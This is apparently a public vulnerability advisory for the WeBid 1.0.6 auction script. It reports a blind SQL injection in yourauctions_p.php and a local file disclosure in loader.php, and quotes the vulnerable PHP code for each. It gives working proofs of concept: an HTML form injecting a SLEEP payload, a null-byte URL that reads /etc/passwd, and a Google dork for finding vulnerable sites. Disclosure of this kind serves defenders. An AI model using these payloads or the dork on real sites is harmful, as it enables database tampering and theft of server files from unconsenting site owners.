@@ -1,0 +1,124 @@
+# Title: Webid Blind SQL Injection / Local File Disclosure Vulnerability 
+# Google Dork: intext:"Powered by WeBid"
+# Author: Ahmed Aboul-Ela
+# Contact: Ahmed.Aboul3la[at]gmail[dot]com
+# Vendor: http://www.webidsupport.com/
+# Software Link: http://sourceforge.net/projects/simpleauction/files/simpleauction/WeBid%20v1.0.6/WeBid-1.0.6.zip/download
+# Version: 1.0.6 (current latest release) and prior versions should be affected too 
+# Tested on: Linux
+
+- About the Software: 
+
+  WeBid is an open-source auction script package.
+  Although still in beta stages WeBid is one of the best open-source solutions for getting an auction site up and running quickly and cheaply.
+  Written in the popular scripting language PHP and with a large collection of highly customisable features
+  WeBid is the prefect choice for setting up any auction site. (Quoted from the vendor)
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 1) Blind Sql Injection Vulnerability in "/yourauctions_p.php"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 
+     - Vulnerable Code Snippet :
+     
+	  LINE 29: if (isset($_POST['action']) && $_POST['action'] == 'delopenauctions')
+	  LINE 30: {
+	  LINE 65         if (is_array($_POST['startnow']))
+	  LINE 66         {
+	  LINE 67                 foreach ($_POST['startnow'] as $k => $v)
+	  LINE 68                 {
+	  LINE 69                         $query = "SELECT duration FROM " . $DBPrefix . "auctions WHERE id = " . $v;
+	  LINE 70                         $res = mysql_query($query);
+	  LINE 71                         $system->check_mysql($res, $query, __LINE__, __FILE__);
+	  LINE 72                         $data = mysql_fetch_assoc($res);
+	  LINE 73 
+	  LINE 74                         $ends = $NOW + ($data['duration'] * 24 * 60 * 60);
+	  LINE 75 
+	  LINE 76                         // Update end time to "now"
+	  LINE 77                         $query = "UPDATE " . $DBPrefix . "auctions SET starts = '" . $NOW . "', ends = '" . $ends . "' WHERE id = " . intval($v);
+	  LINE 78                         $system->check_mysql(mysql_query($query), $query, __LINE__, __FILE__);
+	  LINE 79                 }
+	  LINE 80         }
+	 
+      As we can see the $_POST['startnow'] was directly used in mysql query without any kind of sanitization which could lead directly to blind SQL Injection 
+	
+     - Preconditions to successfully exploit the vulnerability:
+     
+	1. should be logged in with a normal user account
+	2. get the csrftoken which is necessary to send the POST Request
+	
+     - Both conditions can be easily Achieved by the following:
+       
+        1) we can register a free account at http://site.com/WeBid/register.php
+        2) we can obtain the csrftoken with just visiting the page  "http://site.com/WeBid/yourauctions_p.php" 
+           then press on the button "Process selected auctions" in the page and then capture the POST request 
+           that will be send with any tool like Tamper Data or Live http headers Firefox plug-in
+           and we can find the csrftoken code used at the POST data  ..
+           
+           Example: csrftoken=c30172232742c5863925457813daad12&action=delopenauctions&Submit=Process+selected+auctions
+           
+           
+     - Proof of concept for Exploitation:
+     
+         <form method="POST" action="https://site.com/WeBid/yourauctions_p.php">
+	 <input name="action" value="delopenauctions">
+	 <input name="csrftoken" value="c30172232742c5863925457813daad12">
+	 <input name="startnow[]" value="0 or SLEEP(10)">
+	 <input type="submit">
+	 </form>
+	  
+        we should see the page response will delay for 10 Seconds which means that the mysql SLEEP() function was successfully executed :)
+        
+       
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 2) Local File Disclosure in "/loader.php"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+  
+    - Vulnerable Code Snippet :
+
+	    LINE 18: if (isset($_GET['js']))
+	    LINE 19: {
+	    LINE 20:         $js = explode(';', $_GET['js']);
+	    LINE 21:         foreach ($js as $val)
+	    LINE 22:         {
+	    LINE 23:                 $ext = substr($val, strrpos($val, '.') + 1);
+	    LINE 24:                 if ($ext == 'php')
+	    LINE 25:                 {
+	    LINE 26:                         if (check_file($val))
+	    LINE 27:                         {
+	    LINE 28:                                 include $val;
+	    LINE 29:                         }
+	    LINE 30:                 }
+	    LINE 31:                 elseif ($ext == 'js' || $ext == 'css') 
+	    LINE 32:                 {
+	    LINE 33:                         if (is_file($val))
+	    LINE 34:                         {
+	    LINE 35:                                 echo file_get_contents($val);
+	    LINE 36:                                 echo "\n";
+	    LINE 37:                         }
+	    LINE 38:                 }
+	    LINE 39:         }
+	    LINE 40: }
+	    
+     - Explanation: 	    
+
+         As we can see the page takes the input $_GET['js'] from the user, at the line 23 it extract the extension from $js parameter and store it in variable $ext
+         at line 31 it check if the extension is equal to js or css then at line 33 it checks if file exists on the server
+         afterwards simply it execute  file_get_contents() function which reads the file content and print it in the page .
+         
+         We can exploit the code easily by using the null byte trick to fake the extension as if it will be css or js
+        
+     - Proof of concept for Exploitation:
+         
+          To read /etc/passwd: http://site.com/WeBid/loader.php?js=/etc/passwd%00.css 
+         
+          We will see the /etc/passwd was successfully fetched in the page :)
+         
+     - Precondition to successfully exploit the vulnerability:
+     
+	 1. PHP Version should supports the Null Byte poisoning ( php version < 5.3.4)
+        
+  - Credits: 
+
+  Ahmed Aboul-Ela - Information Security Consultant @ Starware Group
+ 
